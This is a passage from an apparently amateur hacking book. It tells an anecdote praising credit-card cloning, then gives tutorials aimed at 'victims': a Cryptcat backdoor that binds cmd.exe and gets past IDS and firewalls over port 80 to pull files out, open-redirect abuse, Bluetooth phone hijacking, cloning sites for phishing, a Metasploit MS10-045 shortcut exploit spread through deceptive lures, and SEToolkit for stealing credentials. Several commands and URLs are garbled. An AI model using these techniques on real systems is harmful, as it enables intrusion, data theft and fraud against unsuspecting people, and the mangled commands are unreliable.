beware of who you allow to stay around you because you never know. As a hacker, you can always get based on people’s mistakes and with their security problems, while vice versa in this case is not possible except if the other people are hackers too. Another advantage hackers get from you is that via computer hacking they can control your machine and do whatever they want to with the machine or worst  than  that,  Monster  Hackers  can  let  your  machine  become  their operating machine and if authorities will find out the hack guess who will pay? You will do it defiantly because the hack is made from your machine. Another thing hackers can do is shutting out the systems of the victims and attack their victim’s system by sending viruses and worms to it while non hackers are not capable of doing this because they are not skilled.   There is a category of hackers which is based on social engineering, guess who will help those hackers get their goal? The victim will do it by clicking the infected links, files or documents they receive via email. Other hack operations like stealing passwords, sensitive data such as email address,  money  or  photos  can  be  performed  by  hackers  and  non  hackers have no chance to succeed. At the main advantage that non hackers get from hackers is wearing a form of a lesson because you can learn from hackers that there is no 100% secure technology and you can also switch the situation in your advantage by using hackers to help you in problems as sensitive data recover but hackers are the ones who can harm your privacy at the same time. If  right  now  a  battle  would  start  between  hackers  and  non  hackers,  the victory is for hackers because they are always informed and ready to action with their skills. As a hacker you are always under mission so you keep your mind active, something that non hackers cannot take advantage of. So,  seeing  the  advantages  and  disadvantages  of  the  problem  is  a  hard operation because there are two sides that are taking advantage of the others side disadvantage and that is how it works in general, but if you have well based  package  information  and  skills  you  can  turn  the  situation  in  your favor anytime. It all depends on vision and on how hackers and non hackers can redirect such a problem.   CHAPTER 6: HACKING TO CHANGE THE WORLD POSITIVELY An Anonym Hacker Who Could Save the World  based on real case   “The past is a foreign country; they do things differently there.” that is what L. P. Hartley said once, and taking a little time to think about this quote was definitely one of the best decisions ever because it is really surprising how your  brain  can  make  connections  with  the  reality  around  you,  sometimes you feel like everything is going crazy and you do not understand anything just take a few hours and think about it, the solution always exist. This quote made me remember about an old childhood friend, we will call him  Mister  R  in  this  story.  I  have  met  Mr.  R  in  a  park  in  Romania,  this happened when we were both at age of 6, sixteen years ago. I and Mr. R were  associated  in  making  sand  castles  of  sand  in  the  park;  we  were  the masters there because everyone knew who were the authors of the castles which  were  filling  more  than  a  half  of  the  sand’s  area  in  the  park.  I  was coming with the forms and Mr. R was bringing water and shovel, that was our mix to build our famous castles and thinking about those times make me feel like they happened a million years ago in another life. After building our famous castles, we were often tempted about the idea of getting together and watching cartoons such as Dexter’s Laboratory at Mr. R’s house, we are still fascinated about everything than means technology, devices  and  machines  and  about  how  do  they  work.  But  destiny  did  not want us to continue growing together so we separated because I had to go to my native country. Romania was for me just for holidays and my beautiful friendship with Mr. R was consumed in the summer more than ever because we were meeting only in the summers when I was coming to Romania. Time flew so fast and we became almost teenagers, the biggest trend of that time  was  to  have  an  email  address,  and  because  I  and  Mr.  R  loved technology  we  have  got  our  first  addresses  when  we  were  in  the  period between puberty and adolescence. Those email addresses were the only way to communicate with Mr. R and as a result we both started to spend days and even weeks in front of the calculator. Special connections exist between   people and they are just like the connection between a router that is giving internet and a computer that it is using it, both of them know all the details about each other. The same was happening between me and Mr. R because  even  if  we  did  not  talk  for  days  we  almost  knew  what  is  each  one  of  us  thinking  about,  I  knew  what  Mr.  R  was  thinking  about  and  Mr.  R  knew  what I was thinking about as well. I still remember how excited we were  both of us when we were hearing that a new program is going to be realized  or  about  a  new  device  that  is  going  to  be  on  sale.  Technology  kept  our  friendship active through the time and we were using technology in order to  talk about it, I was telling Mr. R all the news and updates I knew about the  technology and vice versa.   Our  favorite  place  in  this  world  is  Technisches  Museum  Wien,  Austria because it is the right place to see the evolution of machines from the oldest times  to  the  current  times,  you  can  see  from  old  trains  and  electricity devices to the latest models of Tesla cars, you can see from airplanes such as  Diamond  DA  42  to  Piston  steam  engines  and  one  of  the  biggest technology  range  in  the  world.  For  us,  the  trip  was  just  like  paradise because both of us were feeling like home in that museum. In that trip to Austria, on our way to home, Mr. R was behind a person that was  whispering  to  his  friend  about  how  successful  he  is  in  hacking  and about how much money he earns monthly doing it. After we both arrived from our trip, I went home and Mr. R went directly to the library saying that he needs something urgent, I felt that something is not going on as it should but I didn’t pay much attention and I regret it now. On his way to the library, Mr. R was walking very fast because this is an effect he gets when he has a good idea and in a moment of inattention he has got into a car accident. I have got the black news from my sister who was working as a doctor in the hospital where Mr. R spent a lot of time. I went to see Mr. R’s situation and when I saw him I felt very guilty because I  didn’t  stop  him,  but  in  my  head  was  something  like  “seriously?  Will  I keep listen to all my feelings? There are more impornat things”. More than that, I had to go to my country 2 days after the accident “abandoning” Mr. R in the hospital even if he wasn’t alone at all. Mr. R stayed in coma for 3 days and after the 3 days, he woke up.   I was home, feeling horrible about the situation with Mr. R and I didn’t talk to him very much until we met again in the summer. When I saw Mr. R in the summer, his behavior has suffered modifications; he was spending most of the time at home saying that he is studying. I called him in the park we have met for the first time and I decided to talk opened to him about all the situation about the accident and fortunately, our connection was established again because he decided to do the same. Do people work like machines?! I told Mr. R that I was feeling guilty about what happened and asked him why he went to the library in that day and didn’t pay attention to the cars around him and Mr. R answered “I went to the library because I wanted to get a manual about hacking. I was walking fast and I forgot to pay attention to the cars because I was too distracted by my idea, I felt like extra natural forces were controlling me at that moment” and our discussion continued until the rain started, and because Mr. R’s home was closer to the park than mine, we both decided to go there. When  I  arrived  at  Mr.  R’s  house  I  felt  like  being  in  Dexter’s  Laboratory  because  there  were  different  kinds  of  machines,  one  PC,  two  laptops  and  some papers thrown on the floor. I did not have to ask because Mr. R started  to tell me everything, he said that in his coma period he had a vision about a  “future life” and after he has got off the hospital he bought machines that  were cloning credit cards and started to use them, he had a lot of CD’s and  he told me that he is officially a student at the IT University in our town.   Mr. R’s hacking operations were successful, his card credit clones worked  undetected  and  he  started  also  to  make  money  from  hacking  transferring  money  to  his  account.  It  was  a  little  bit  SF  for  me  to  see  his  house  transformed but however….  Years were gone and Mr. R has just finished his studies but never worked legal  using  his  Diploma,  he  were  saying  that  he  is  making  more  money from those operations and he does not have to work anymore. He became famous in the town across the time and his intelligence was explored day by day and he was saying that he has money in accounts all around the world, all made from “business”. One day he decided to throw a party at one of his residences, because he bought  more  houses  after  he  has  got  full  of  money  and  local  authorities   knew about him and his abilities but he was too undetectable and they did not  have  any  proof  about  him.  So,  at  his  party  people  felt  great  but  the neighbors  did  not  feel  great  because  the  party  people  were  too  noisy  and they were too old so they called the police, and the police can’t waited for such a moment! They have got Mr. R in the prison for breaking the public discipline  laws  but  Mr.  R  was  too  smart  for  such  cheap  actions,  in  fact, getting him in jail was a game controlled by big powers and institutions. In the  prison,  Mr.  R  has  got  several  offers  to  work  for  NASA  and  security international organizations and the condition to get his freedom again was to  accept  one  of  the  big  offers,  that  is  how  he  got  out  of  the  jail,  by accepting other’s rules to play with people’s lives but because Mr. R is a very clever person, it has a plan to escape from the miserable situation he is in now. Mr. R’s abilities are considered very high because the organization he works for  now   forced   consider  him  the  master  piece  in  saving  some  security systems, but Mr. R is smart and he won’t tell his secrets and ideas too easy. It is funny how others have the permission to break the rules made by them! Our  world  is  such  a  defect  one  because  the  vulnerabilities  have  been discovered but in order to resolve the problem, Big People prefer to keep them hidden and take full advantage of them. The only way to save ourselves from those dirty big games powered by Big people who are superior to every one of us by their influence is to open our eyes and as hackers invest time in exploiting vulnerabilities, we should do the same as they do, we should analyze flaws in our system and make all the world wake up at the same time. The question without answer is: If all the people from the world would generate a big revolution, who will win? The ones who got the power or the ones who are right and can prove the truth but they are controlled?! It is easier to repair a computer system than a worldwide system.     CHAPTER 7: HACKING TIPS AND TRICKS Tips and tricks about any domain in life are welcomed but a special place is occupied by technology tips and tricks, they help you do your work faster in some cases and in other cases you discover some new features which you did not even know that exist, and because we love updates and we love to try  everything  new  we  are  going  to  start  with  some  tips  and  tricks  about Windows 8 because it is relatively new and unfamiliar for those who just installed it, so here we go, tips and tricks below:  Utilize and hack the Power User Menu   Microsoft has all the rights to take or give anything about their programs and  systems  and  this  is  what  Microsoft  did  here  as  well,  here  is  no  start menu. But Microsoft is professional so they delivered a helpful new tool called the  Power User Menu. So, right-click in the lower left tusk of your desktop and  it should show up a written menu which allows you to access 16 utilities  and between them you will find tools like command prompt, Run box and  an administrative command prompt. Click on “Programs and Features” and  by doing this you deliver to your Control Panel an applet which will allow  you  to  uninstall  your  desktop  programs,  take  a  look  at  what  updates  you  have and switch certain Windows features either on or off. Mobility Center  will  take  you  to  an  applet  which  is  going  to  let  you  change  your  screen  orientation, manage brightness and a lot of other settings.   Also, something interesting about Power User Menu is that you can hack it. It is allowing you to remove files you do not want there and add the items you want to appear just like a list of most used programs, games, etc. Check if everything works as it is supposed to and make sure that you can access hidden files in File Explorer and take a trip to: C:\Users\ username \AppData\Local\Microsoft\Windows\WinX And there username will be your account name; you should find three files there.   Every one of it has shortcuts to Power Menu applications. The first group   file  Group  1   includes  the  Desktop  ;  the  second  group  has  as  content  the Control Panel and Task Manager and you will also File Explorer, Run and Search;  The  last  group  includes  the  two  command  prompts  ,  device manager,  event  viewer  and  everything  that  was  not  included  in  the  other two groups. If you take a look and Power Menu you will observe that there are three groups and those are the files which belong to WinX folder. In order to modify the Power User Menu, edit the contents of folders G1, G2 and G3. If you are going to remove a shortcut it will fade away from the menu and if you add it, it will appear immediately. To hide a shortcut select it an hit your delete button and to add a new one open the folder you want it to be like a home for your shortcut and right- click  on  an  unfilled  spot  and  select  New  Shortcut  and  follow  the instructions. To  finish  the  operation,  sign  out  of  Windows  and  then  enter  again  to  see your new Power User Menu.  Why not fool your window’s Mail app into utilizing POP mail As you noticed, this Windows is way more different than the other versions and it has a lot of surprising things to explore. This kind of windows will not work with POP3 mail protocol and all the email accounts that use this type of protocol, it is working with accounts that use IMAP. You can change this and make any email address to get POP3-based mail from a POP3 account and then set up your Windows to get mails from that account. First of all , if you have an Outlook mail account then configure it to get POP3 mail by following the next instructions:  1. Log in and click on the settings icon and select the option “More mail settings” 2. You will find under your “Managing your account” option another option called “Your email accounts” and after that select “Add a send-   and-receive account” 3. Once you did this, a screen should pop up and select from that screen “Advanced options”. 4. If you are going to access your mail from multiple devices  ensure  that you leave a message on the server. 5. After that, you will be asked to create a new folder for the mail or keep it in your email address, here you are free to choose what you want and after that click next. 6. They will send you a verification mail to your POP account, you must click on that link and you will be redirected to an Outlook page that will tell you that you are set up.  Now, you are done. Also, you can configure your Gmail to get POP3 mail attempting the next steps:  1. Open your Gmail account and select Settings, after that select Accounts and import and next select Add a POP3 mail account you own. 2. A screen should show up, enter your Gmail address there. 3. Another screen should appear here as well, give all the information you need to access your POP account and if you do not know it please check with your mail provider. 4. After you resolved the problem, click on Add Account. And make sure you tell Gmail that you want as well to send messages from your account not only get them. 5. Now you should receive a verification mail on your POP3 account, click on the link and follow the indications.  The last thing to do is running Windows 8 Mail app, in order to do it please hit  the  Windows  key  on  your  keyboard  +  C  and  Windows  will  display   Charms bar, once you see it select Settings, next select Accounts and Add an account. In  order  to  get  mail  from  Outlook.com,  select  it  on  the  screen  and  enter your email address and password and click Connect. To get a Gmail mail select Google on the screen and the rest is the same as in Outlook.com case. Enjoy the new settings! So, as we all know now, DDoS attacks are very frequent and their number is growing hour by hour, so here are some tips to help you avoid a DDoS attack:   Before taking any measures you should understand what a DDoS attack is. DDoS  distributed denial-of-service  attacks happen when attackers try to compromise a computer by making its recourses inaccessible to its user.   In order to protect your computer, buy more Bandwidth because in this case more is better. Make sure you have enough bandwidth on your own web. This allows you to tackle unsophisticated DDoS attacks by getting more bandwidth to serve the requests. It helps a lot because a DDoS attack is such a capacity game.   Choose DDoS migration services; you can request it from your internet provider,  it  is  better  to  search  for  the  provider  that  has  the  largest  DDoS protection  network.  You  can  also  utilize  a  DDoS  prevention  piece  of equipment which could be specially created to prevent DDoS attacks.   Restrict your connectivity! If  you  have  computer  programs systems  which  are  in  a  direct  connection with the web install a firewall because it is offering you a plus of protection. Hacking is such an enjoyable activity, but if you want to hack make sure you  will  be  undetected,  if  you  do  not  know  how  then  this  book  has  an answer  for  you.  Do  you  know  how  to  make  a  nearly  and  undetectable backdoor using Cryptcat? It is fun to learn and apply, if you want to do it please follow the next directions: First,  you  have  to  search,  download  and  install  Cryptcat  on  your  system which is an encrypting netcat and you can get it but it is a little bit harder to   it   it   is   so   the  on   the   here   internet   find  linkhttp:  sourceforge.net projects cryptcat files . The communication between two devices is encrypted using twofish which is a great algorithm, the encryption is on par with AES one making it nearly impossible to find. After  you  install  it,  move  to  the  next  step  by  opening  a  Listener  on  your system  with  a  similar  syntax  to  netcat,  in  the  following  example  we  will open it on a windows 7 on port 6996 : cryptcat -l -p 6996 -e cmd.exe and the command prompt will show: C:\nt>cryptcat -1  -p 6996  -e  cmd.exe The next step is opening Snot or any other IDS, you should start it up on another system which will stick together with the Windows system to check if the encryption is capable of blinding the IDS, because we want to keep our invisible to the security systems. root@bt: ~  snort  -dev-c   etc snort snort.conf Next, connect the system with Cryptcat from your BackTrack system and full an encrypted backdoor connection that is not possible to find.   cryptcat 192.168.4.182.248 6996  and the next will be displayed:   root@bt: ~ cryptcat 192.168.182.248 6996 Microsoft Windows [Version 5.2.3790]   C  Copyright 1985-2003 Microsoft Corp.   C:\>   If  something  similar  to  the  above  pops  up  then  you  are  on  the  right  way because  you  have  just  connected  to  the  system  and  received  a  command shell from the system.   To continue, see what is going on with your Snort Logs and Alert because this  type  of  attack  using  a  command  shell  passed  across  the  line  is detectable  using  Snort  or  IDS’s  if  the  connection  is  encrypted  at  that moment. Snort rules are sending alerts to the admin that a cmd.exe shell is traveling across  their  network  connection  but  with  your  encrypted  conection  in cryptcat it should be impossible to detect. Check your alerts and logs in Snort, if everything is going on as it should you should not get any alerts on the subject of command shell. In order to be successful you should connect to the system without getting any kind of attention from security systems. To  continue  the  operation,  you  should  evade  the  firewall  by  sending cryptcat over port 80. Even if you have shaped a backdoor on your victim’s system some of the administrators may notice that port 6996 is open which is not normal at all  for them . Networks  are  capable  of  communication  on  the  internet  if  they  keep  the ports 80 and 443 and maybe 25, 53, 110 open. After you learned how to use cryptcat you should send it to port 80 with the all traffic. It will look like any other binary data crossing the line even if it is encrypted and that is the reason why it is undetectable and impossible to block, the IDS is not capable of seeing what it contains. If you want to move a file from your victim’s system to yours without being undetected  you  should  send  a  file  with  the  same  name  as  the  stolen  file across  the  encrypted  connection,  you  can  do  it  by  typing  this  in  the command prompt: cryptcat  -l  p  80  <  topsecret.txt    and  the  command  prompt  will  show  C:\>cryptcat  -1p80  <topsecret.doc  The  next  step  is  connecting  to  the  victim’s  system  and  put  secret  file  on your  victim’s  system.  Connect  to  the  listener  by  typing  cryptcat  and  the Internet Protocol address of your victim’s system and the port number to the listener. cryptcat 192.168.182.248 80   And after doing this the file you want the steal should come to you. Check the file alert after again to make sure you are undetected. kwrite  var snort alerts You can notice that the file has crossed though port 80 under the eyes of  IDS without being undetected.   Cryptcat is a grand little instrument for moving information off the victim's  system  across  the  typical  open  ports  without  any  of  the  security  devices  detecting it.   So, this method is often used by hackers and a lot of devices are hacked in this way without being undetected. Do not be afraid of trying!   Want to trick victims and make them your visitors? You can make it and this book is going to show you how. Redirecting victims to your website is crucial  if  we  talk  about  hacking  because  few  methods  used  in  hacking include this trick. So,  if  you  wan  to  redirect  any  site  from  Google  please  go  to  Google Redirect Exploit and after getting there you should enter your URL in a box on that page. After you enter your URL please click on Submit and Google’s URL should  produce another URL starting with google.com but with a few characters in  plus, that will be your URL. And now you can start using it and any person  should be directed to your site via your URL.   Also, there are several website which are forbidden by government because they  are  breaking  the  laws  of  their  country,  if  you  want  to  access  such  a website they might request you to download several files programs which in  80%  of  the  cases  are  malware,  so  please  do  not  download  anything strange. There is a trick you can use if you want to enter banned websites that does not request any download, in order to start using it you should firstly open incloack.com using your browser or you can use any proxy site you trust instead of the suggested one.   After  you  choose  your  proxy  site,  search  for  a  box  that  is  requesting  an URL, the URL you should enter must be the banned site URL. The last step is clicking on Hide Me option and surf the internet. Protect the sensitive data on your computer by putting it in a hidden folder, to create a hidden folder on your system please follow the next indications: 1. Go to start menu and click on Run 2. Write cmd and punch enter in order to open your command prompt 3. Next, write D: and strike enter again 4. Write md con \ and strike enter 5. In place of md you can use one of the following words aux, lpt1, lpt2, lpt3 up to lpt9 6. You should open the directory and find a file created with the name con If you want to delete that folder Windows will show error, but if you really want to do it, here is how to delete it: First, open Command prompt ant type D: and hit enter, after that type rd con\ and if you open the directory again you will find out that the file is deleted.   As we know, computer hacking is not the only type of hacking and there are many others, but mobile phone hacking has become very famous because if you hack a mobile phone you can get sensitive data and you can do a whole set of activities such as reading messages, get back the phone to the factory settings, ultimately switching on and off the phone, changing the phone’s ringing volume, see contacts or play ringtone even if the phone is on silent mode, all those actions will make the hacked phone look like it would be controlled by the evilest powers. *NOTE:  The  following  method  in  phone  hacking  request  a  Bluetooth enabled phone because it is based on Bluetooth. So if you want to hack a mobile phone, you can succeed by following the next steps:   Enter the internet and search for Super Bluetooth Hack 1.8, after you find it please download and install it. After that make sure that your phone is in the list of handled handsets from the link delivered, after you get the .jar file , install it on your phone. The interesting and good thing about this method is that you do not have to  install the software on the phone you want to hack and this is rising up the  method’s efficiency.   For  getting  into  the  next  step,  turn  on  the  Bluetooth  of  your  handset  and after that please open the Super Bluetooth Hack App you just downloaded and installed. Next,  you  should  select  the  connect  option  and  after  that  select  Inquiry Devices in order to look for any mobile that has the Bluetooth enabled near  around you. Pairing between the phones is very important so your victim must have the Bluetooth turned on; after the application finds your victim’s phone you can start exploring it! Most methods of hacking are requesting the Internet Protocol address and sometimes  it  is  the  only  thing  that  hackers  should  know  in  order  to  start hacking, but what if you could hide it? It will be another security measure taken by you against hackers. By hiding your Internet Protocol address you will be able to surf the internet anonymously without leaving any mark that can guide to you, hide your geographical position on the globe and the most important, to stay safe. The  safest  and  secured  way  to  hide  your  Internet  Protocol  is  by  using  a trusted  VPN  service,  for  example  VyprVPN  which  will  offer  you  the services with the highest speed on the market. A VPN service is always better than any other method because the service encrypts all your internet traffic, it is keeping the speed high and does not have any effect on it in comparison with other methods and you can avoid location blocks without any effort. Another method to hide your Internet Protocol is using website based proxy servers such as anonymouse.org, and because it is web based they do not request any download or installation which is helping you to save space.   Also, you can use BCPS- Browser Configured Proxy Services and you can find hundreds, thousands of them for free on the internet, they give you a fake  Internet  Protocol  address  you  that  will  configure  your  browser  with and start hiding your original Internet Protocol address. The only problem with this method is that it has became very popular though the time and as it does not request money most of the people use it because they prefer to not pay and get a second quality service and as an effect they perform too slow under normal parameters which is not likely at all. Hacking can save or destroy lives, it can destroy a victim’s life or a hacker’s life  but  everything  depends  about  how  both  of  them  are  playing,  it  is depending more on the hacker to choose what he want and think really good before he start the action and it is depending on the victim’s attitude as well because in a real game there is not only a player. Everything depends on how both players are handling the situation and if they know to turn it in their favor. Now that we learned how to hide an Internet Protocol address, we should learn how to find the exact location of any Internet Protocol address so here we go. This  method  requires  a  Linux  system  and  if  you  have  it  you  can  start immediately.  Fire  up  your  Kali  system  and  continue  with  opening  a terminal. Next, you will need the Database and you can download it from MaxMind which  is  a  big  company  that  owns  the  database  of  the  world  because  it contains  every  Internet  Protocol  Address  accompanied  by  its  GPS coordinates on the globe, zip code and all the details you need in order to know everything about the Internet Protocol Address and its place on the globe no matter on which corner in the world is the IP located and you can obtain it by writing the next text: kali  http:  geolite.maxmind.com download geoip database GeoLiteCity.dat.gz and then you will have to unzip it kali> gzip -d GeoLiteCity.dat.gz root@kali:~ wget-N-qhttp:  googlecode.com  wget   -N   -q  >    can  get   the  next   it  by  writing   text:  kali  >  wget   pygeoip.googlecode.com    to  pygeoip.googlecode.com    pygeoip.googlecode.com   …  http:  pygeoip.googlecode.com files pygeoip-  After  that  you  will  have  to  install  Python  script   pygeoip   in  order  to continue the operation so please do it because it helps a lot in reading the database.

After you make sure that you have the database where it is supposed to be and the pygeoip installed on your system you should start to interrogate the database using pygeoip. Take attitude and start a Python shell and after that you  should  be  welcomed  by  “>>>”  which  confirms  that  you  are  in  an python shell, continue by importing the module: >>>import pygeoip >>>gip = pygeopip.GeoIP 'GeoLiteCity.dat'  After that you should be ready to start the interrogation, go look where is Google located. >>>rec = gip.record_by_addr '64.233.161.99'  >>>for key.val in rec.items  : ... print "%s: %s" % key,val  ... If the operation is going right then you should see a screen that indicates similar content to what is below: >>> rec=gip.recorded_by_addr `64.233.161.99’  >>> for key.val in rec.items   : …  print "%s: %s" % key,val  … City: Mountain View Region_name: US Area_code: 650   Longitude: -122.0574 Country_code3: USA Latitude:  37.4192 Postal_code: 94043 Dma_code: 807 Country_code: US Country_name: United States >>> As you noticed, we found out Google IP address. But  does  your  curiosity  get  satisfied  only  with  that?  That  was  just  a confirmation of the success you expected but the real secret of success is that you should never stop trying, so try now to find out the location of the IP address of cnn.com. >>> rec=gip.record_by_addr `157.166.226.25’  >>> for key,val in rec.items  : …  print "%s: %s" % key,val  … City: Atlanta Region_name: GA Area_code: 678 Longitude: -84.388 Country_code3: USA Latitude: 33.749 Postal_code: 30348 Dma_code: 524 Country_code: US Country_name: United States >>>   CNN’s Internet Protocol was just discovered due to the mix of database and pygeoip with some attention and work, a hacker could do anything. * IMPORTANT NOTE: all the presented operations should be done with a maximum  of  attention  and  patience.  Skills  are  crucial  in  this  kind  of operations and a lot of exercise is needed in order to get the success from the  first  time  you  try.  Make  sure  you  respect  all  the  syntaxes  and  codes because in hacking even typing wrong a letter could be crucial and guide wrong the whole operation ending up with a huge failure or maybe a new discovery. Informatics are in the same family with mathematics where you have to find solutions for problems as well, think and react with speed, be very skilled and the most important common feature is that if you make just a small  unnoticed mistake you might destroy literally everything. Are you interested in cloning websites? If you want to try all the methods of hacking  then  your  answer  is  yes  for  sure  because  there  are  methods  of hacking  which  are  requesting  to  redirect  victims  to  your  websites  which should look identical as the ones you want to hack, in fact that is the key to succeed! Why complicate yourself and waste your precious time and ideas on creating an identical website? You can just clone it and your hack is half done. HTTrack  is  the  instrument  to  use  in  copying  websites,  prepare  your  hard drive because HTTrack is making copies of any website you want and after that it is copying it to your hard drive. Twins are always different and there will always be a good twin and a bad twin, the same is with creating these websites, you will produce the bad twin who is doing good things for you. The tool is efficient if we talk about social engineering and searching for any data on the cloned website without internet which is a great feature, you can  use  this  tool  on  a  Windows  and  Linux  software  because  fortunately there are two versions of HTTrack. Begin  with  downloading  and  installing  HTTrack,  you  can  install  it  by  typing the syntax  kali > apt-get install httrack. After  you  have  installed  it,  move  to  the  next  step  and  open  it,  after  that,  please start looking for the help file.

If something similar to what is above is also on your screen it means that you just made a clone of everything is on the wanted site. The  next  thing  to  do  after  you  copy  the  website  on  your  hard  drive  is  to look at the website clone and investigate it. Simply place your browser to  tmp webscantest www.webscantest.com login.html to see what is going on with the clone website.  :www.webscantest.com jsmenu gotoframme.php?   Do not you see any difference? Exactly, that is the point. You reached your goal and created exactly the target website but it is cloned. Hacking is not a simple operation because you need to build a plan for the target website before you get into the action, actually, effective hacking is only about 30% while waiting and searching for flaws and vulnerabilities in a system takes the rest of 70% of the time. So, you can not do a successful hack very quick, patience is crucial!   Let’s  continue  website  hacking  road  by  learning  how  to  spider  the  target website because you need to do it before the attack. You have two ways to follow and you are free to choose between: spidering the website manually and spend a lot of time on every page or spidering the website automatically using a tool specially created for that, and because you know the first way, let’s explore the second way and find out how to do it by simply following the next instructions: If  you  are  using  a  Linux  system  you  do  not  have  to  install  the  used  tool named WebScarab by OWASP because you have in your Kali system. Start with opening WebScarab and when you open it, it should open a GUI interface with a white gray background. The next step is to configure your browser before you start spidering.  The  tool  WebScarab  is  using  a  proxy  on    127.0.0.1  on  8008,  make  sure  your  browser is using the same settings. After  that,  you  should  place  the  tool  on  a  website  by  typing  it  in  the Allowed Domains" window and go to the browser you use and navigate to the  website  you  just  provided  and  if  you  are  on  the  right  way,  the  tool should  start  to  fill  the  main  window  with  each  address  connected  on  that page. Using this tool you will be able to not miss any webpage or link on your target website and you will also save a lot of time, take full advantage of the technology that exist nowadays in order to reach your goal. WebScarab help you hack better than ever. More information means more power to action and that represents the major reason  why  we  will  remain  under  the  same  class  which  is  hacking  web   applications  and  become  skilled  at  how  to  hack  those  websites  which request authentication. To start this trip you do not need a map because this book will be your map, you need just to follow the next steps:  Go navigate the internet and search for DVWA-  Damn Vulnerable Web  Application  and  once  you  find  it  please  install  it  on  your  system  to  start  practicing your hacking skills. Even if the application is relatively old you  should begin with it because you will prove the values of web application  hacking  and  because  it  represents  a  safe  atmosphere  to  work  in.  You  can  install the application on a Linux system or you can choose to install the  Metasploitable operating system because DVWA is already installed there. If you choose the second option , start by searching your Internet Protocol address  using  the  Iceweasel  browser  in  Kali,  after  you  searched  for  your Internet Protocol address, a white page should appear with four options on it  including  DVWA,  please  select  DVWA  by  clicking  on  its  link.  The DVWA login screen should appear after you open it requesting some log in details but do not log in yet. Next,  on  this  kind  of  attacks,  you  should  start  using  Burp  Suite  which  is fortunately  already  built  into  Kali,  when  you  start  using  it  you  should  be welcomed with a GUI from Burp Suit and right there you should configure Burp Suite as being your proxy. You  should  also  know  that  there  are  three  categories  of  web  based  authentication:  BAA-  Basic  Access  Authentication,  DAA-  Digest  Access  Authentication and FBA- Form Based Authentication.   The  first  category  is  very  easy  to  break  into  because  it  is  working  with Base64  encoding,  this  base  transforms  binary  information  to  textual information which is easy to decode. The second category is more secure than the first one and obviously harder to break but one of its vulnerabilities is about attacks, it can not be attacked via a method like rainbow tables but remember that everything is hackable, you just have to use the right method. The third category and the last one at the same time it represents the most used figure of authentication in HTTP. This is the most common figure of authentication used by contemporary sites because it is easy to use, the user   gets access if he sends the right requested information to the server. It is not simple to hack it because it is using several forms of encrypting. Now  that  you  know  that  you  can  move  to  the  next  step,  log  in  to  Damn Vulnerable  Web  Application  by  delivering  a  blend  of  username  and password. Study the page with attention until you find a DVWA Security option and set the security level to “high”. Now, go back from where you started, the login screen and give the source code  a  regard  and  you  can  notice  the  username  turned  into  unusual characters which can be worn in a SQL injection and the same observation in the password’s case and those transformations are done just to avoid the option of a SQL injection. After that, the two character strings are thrown into a SQL interrogation to jog in opposition to authentication database. And  now  you  are  able  to  see  the  other  face  of  the  letters  you  type  using your keyboard. Now  let’s  get  away  from  this  area  and  move  to  another  one,  Windows  7 should  be  hacked  too!  Hacking  Windows  7  can  be  such  a  pleasure  and  a challenge  at  the  same  time.  Windows  7  has  vulnerability  in  managing Windows Shortcut files and we should take full advantage of it, to send a malicious  file  and  take  full  advantage  of  the  well  known  vulnerability please begin by following the next instructions: Open your Metasploit operating system and then fill the exploit using what figures as MS10-045 in Microsoft’s Security Bulletins and takes profit of a shock absorber excess in the shortcut dll. Fill it by using this:  msf > use windows ms10_045_shortcut_icon_dllloader  . After that, pay extra attention to study better the exploit by requesting its information. You will notice that the extensor says : "This  module  exploits  vulnerability  in  the  handling  of  Windows  Shortcut file  .LNK  that contains an icon resource pointing to a malicious DLL." Now, you should produce a shortcut that once clicked by anyone who uses the target system will let the execution of your malicious file so continue with  setting  up  the  options  and  start  by  setting  the  Payload  and  continue   with setting your Internet Protocol as LHOST. After you set up everything you need you can start by writing “exploit” in order to start generating one. What you should do next is to send your creation to your victim, you will have to use some social engineering skills to succeed. Think about all the spam  messages  you  were  highly  tempted  to  click  on  and  get  inspiration from  them,  for  example  those  sites  which  provide  you  great  technical services if you give them your information or the messages that guarantee millions or billions of dollars just by one click. After you decide which lie will cover your malicious plan, send it to the victim and wait because the victim will be welcomed with an alert that needs an allowing click to run your code so be very creative in order to reach your goal and get your click! After the victim gives you indirectly the permission to hack their system, Metasploit will set up the connection between you and your victim. Your  success  will  be  provided  when  you  will  be  welcomed  by  your meterpreter prompt, and once you are greeted you can take full advantage of  the  hacked  system  and  do  what  your  heart  allows  you  or  do  and  what your mind wants you to do such as collecting data on the hacked system or using it to hack another system or anything you want to do. We are humans and we have to work with humans even if some of us does not  like  it,  sometimes  you  should  do  things  you  do  not  like.  As  Albert Einstein said human stupidity is infinite, but there is another thing that is infinite  and  he  forgot  to  mention  it,  we  are  talking  about  how  naive  are some  of  us.  How  could  you  believe  everything  without  even  questioning yourself? That is one of the major reasons why hacking attacks are taking a considerable  growth.  In  hacking,  despite  skills  and  attitude  and  other features  you  need  to  be  very  creative  as  well  because  hackers  are  taking advantage of everything that is around them and that is why they are using what is nowadays known as social engineering. So below you will find such a great instrument used in social engineering in order to steal credentials. TrustestSEC  is  offering  us  a  useful  tool  called  SEToolkit  and  here  is  an example of how to use it in an attack:   Go  to  TrustestSEC  website  and  download  the  tool  which  is  mentioned above and after that, install it. Next, start using the tool by opening it and writing setoolkit after opening up bash and you will be greeted with a question, answer it and the following menu should show up: The Social -Engineer Toolkit  SET [---] Created by: David Kennedy  ReL1K  [---] Version: 6.0.4  [---] Code name: `Rebel’ [---] Follow us on Twitter: @TrustedSec[---] Follow me on Twitter: @HackingDave [---] Homepage: https:  www.trustedsec.com[---] Welcome to the Social-Engineer Toolkit SET  The one stop shop for all of your SE needs.   Join us on irc.freenode.net in channel setoolkit The Social-Engineer Toolkit is a product of TrustedSec.

